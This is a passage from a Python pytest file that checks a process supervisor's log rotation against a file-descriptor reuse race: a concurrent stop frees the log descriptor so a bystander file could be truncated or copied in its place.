    bystander.write_bytes(sentinel)

    write_launcher(project, "sleep 30 &\ntouch ready\nwait\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    await_ready(project)

    lowered = 4096
    supervisor.max_log_bytes = lowered
    os.pwrite(managed.log_fd, b"x" * (lowered + 1), 0)

    real_pread = os.pread
    fired: list[int] = []

    def pread_inside_the_window(fd: int, length: int, offset: int) -> bytes:
        if not fired:
            fired.append(fd)
            # The real stop, on this thread: it pops the entry, signals the
            # group and reaps, and `_reap` closes `managed.log_fd`.
            supervisor.stop(project, grace=0.5)
            fired.append(os.open(bystander, os.O_RDWR))
        return real_pread(fd, length, offset)

    monkeypatch.setattr(os, "pread", pread_inside_the_window)
    try:
        supervisor.rotate_if_needed(project)
    finally:
        monkeypatch.setattr(os, "pread", real_pread)
        for stolen in fired[1:]:
            os.close(stolen)

    assert fired, "the window never opened, so this test proved nothing"
    assert fired[1] == managed.log_fd, (
        "the freed descriptor was not reissued to the bystander, so the hazard "
        "was not reproduced"
    )
    assert bystander.read_bytes() == sentinel, (
        "the rotation truncated a file that was not the log"
    )
    rotated = managed.log_path.with_name(managed.log_path.name + ".1")
    assert sentinel not in rotated.read_bytes(), (
        "the rotation copied a file that was not the log into the backup"
    )


def test_the_duplicate_is_taken_while_the_lock_still_proves_the_entry_is_held(
    supervisor: Supervisor, project: Path, tmp_path: Path, monkeypatch
) -> None:
    """Looking the entry up and duplicating its descriptor is one step.

    Its sibling above covers the copy; this covers the gap before it. Taking
    the `ManagedProcess` under the lock and duplicating outside it leaves the
    same check-then-act: a `stop()` in between closes `managed.log_fd`, the
    next `open` takes the freed number, and the `dup` then names that file --
    so the whole rotation runs against a bystander rather than merely ending
    on one.

    The stop runs on its own thread and is given a bounded wait, because that
    is the only shape that reads both ways: with the lookup and the `dup`
    under one lock it blocks and the wait expires, and without the lock it
    completes and the descriptor is freed inside the window.

    Dies on widening the lock to the lookup alone.
    """
    sentinel = b"another project's log\n" * 64
    bystander = tmp_path / "bystander.log"
    bystander.write_bytes(sentinel)

    write_launcher(project, "sleep 30 &\ntouch ready\nwait\n")
    supervisor.trust.confirm(project, launcher_fingerprint(project, ("./start.sh",)))
    managed = supervisor.start(project, name="demo", argv=["./start.sh"], port=None)
    await_ready(project)

    lowered = 4096
    supervisor.max_log_bytes = lowered
    os.pwrite(managed.log_fd, b"x" * (lowered + 1), 0)

    real_dup = os.dup
    fired: list[int] = []
    stopper = threading.Thread(
        target=supervisor.stop, args=(project,), kwargs={"grace": 0.5}, daemon=True
    )

    def dup_inside_the_window(fd: int) -> int:
        if not fired:
            fired.append(fd)
            stopper.start()
            # Bounded: it can only finish here if nothing holds the lock.
            stopper.join(timeout=1.0)
            if not stopper.is_alive():
                fired.append(os.open(bystander, os.O_RDWR))
        return real_dup(fd)

    monkeypatch.setattr(os, "dup", dup_inside_the_window)
    try:
        rotated_now = supervisor.rotate_if_needed(project)
    finally:
        monkeypatch.setattr(os, "dup", real_dup)
        stopper.join(timeout=5.0)
        for stolen in fired[1:]:
            os.close(stolen)

    assert fired, "the window never opened, so this test proved nothing"
    assert rotated_now is True, "the log over the cap was not rotated at all"
    assert bystander.read_bytes() == sentinel, (
        "the rotation ran against a file that was not the log"
    )
